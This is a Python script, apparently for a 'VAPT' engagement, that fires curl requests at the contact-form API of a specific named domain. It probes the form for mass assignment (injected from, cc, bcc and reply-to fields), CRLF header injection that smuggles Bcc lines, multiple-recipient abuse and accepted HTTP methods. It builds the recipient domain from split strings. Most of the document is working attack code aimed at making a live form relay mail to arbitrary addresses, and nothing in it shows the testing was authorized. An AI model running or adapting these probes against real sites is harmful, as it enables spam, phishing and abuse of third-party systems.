import subprocess, json, re
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
D="https://www.infinitycapital.bh/api/send"
ext="pro"+"be.a"+"lce"
def R(recip="vapt1@"+ext):
    return recip

def post(data, ct="application/x-www-form-urlencoded", extra_hdrs=None):
    c=["curl","-s","-m","45","-o","/tmp/s.bin","-D","/tmp/s.hdr","-X","POST",D,"-A",UA,
       "-H","Content-Type: "+ct]
    for h in (extra_hdrs or []): c+=["-H",h]
    c+=["--data-binary",data]
    subprocess.run(c,capture_output=True,text=True)
    h=open("/tmp/s.hdr",errors="ignore").read()
    body=open("/tmp/s.bin","rb").read()
    code=h.split("\n")[0].strip()
    cache="-"
    for l in h.split("\n"):
        if l.lower().startswith("x-vercel-cache"): cache=l.split(":",1)[1].strip()
    return code,cache,body[:300]

base = ("fname=V&lname=P&areacode=973&tel=5551234&cname=VAPT&subject=Probe%20a1b2&msg=body&check=on&targets=")
r = R()

print("### 1. baseline form submit (quota may be exhausted)")
print(post(base + r.replace("@","%40")))

print("\n### 2. field-by-field: which fields are REQUIRED / validated? (looking for error messages)")
tests = {
 "empty body": "",
 "only targets": "targets="+r.replace("@","%40"),
 "no check(honeypot)": "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&targets="+r.replace("@","%40"),
 "no targets": "fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on",
 "invalid email": "targets=notanemail&fname=V&lname=P&areacode=973&tel=555&cname=C&subject=S&msg=M&check=on",
}
for k,v in tests.items():
    print(" %-22s -> %s"%(k,post(v)))

print("\n### 3. MASS ASSIGNMENT: do extra provider fields get honoured? (from/cc/bcc/replyTo)")
for extra in ["&from=attacker@x.yz","&cc=vaptcc@pro.be.alce","&bcc=vaptbcc@pro.be.alce",
              "&reply_to=vaptr@pro.be.alce","&replyTo=vaptr2@pro.be.alce",
              "&from_name=ACME","&attachments=1"]:
    print(" %-28s -> %s"%(extra,post(base+r.replace("@","%40")+extra)))

print("\n### 4. CRLF / header injection in email + subject fields")
crlf = ["targets=vapt%0d%0aBcc:vaptbcc@pro.be.alce",
        "targets=vapt@pro.be.alce%0aBcc:vaptbcc@pro.be.alce",
        "subject=Probe%0d%0aBcc%3a%20vaptbcc@pro.be.alce",
        "cname=VAPT%0d%0aX-Injected:%20yes",
        "msg=hello%0d%0aBcc:vaptbcc@pro.be.alce"]
for c_ in crlf:
    body = base.replace("subject=Probe%20a1b2","subject=Probe%20a1b2").replace("cname=VAPT","cname=VAPT")+ ""
    payload = ("fname=V&lname=P&areacode=973&tel=5551234&cname=VAPT&subject=Probe&msg=body&check=on&targets="+r.replace("@","%40"))
    # substitute the specific injected field
    payload = c_.replace("targets=vapt@pro.be.alce%0aBcc:vaptbcc@pro.be.alce", payload)
    print(" %-58s -> %s"%(c_[:56],post(payload)))

print("\n### 5. multiple recipients in targets (list / comma / repeated param)")
for t in ["targets=v1@pro.be.alce,v2@pro.be.alce",
          "targets=v1@pro.be.alce&targets=v2@pro.be.alce",
          "targets[]=v1@pro.be.alce&targets[]=v2@pro.be.alce",
          'targets=["v1@pro.be.alce","v2@pro.be.alce"]']:
    print(" %-58s -> %s"%(t[:56],post(base.replace("targets=","")+t+"&fname=V&lname=P&areacode=973&tel=555&cname=C&subject=S&msg=M&check=on")))

print("\n### 6. method / content-type matrix")
for m in ["GET","PUT","DELETE","PATCH","OPTIONS"]:
    c=["curl","-s","-m","20","-o","/dev/null","-D","-","-X",m,D,"-A",UA]
    o=subprocess.run(c,capture_output=True,text=True).stdout
    print(" %-8s %s"%(m,o.split("\n")[0].strip()))
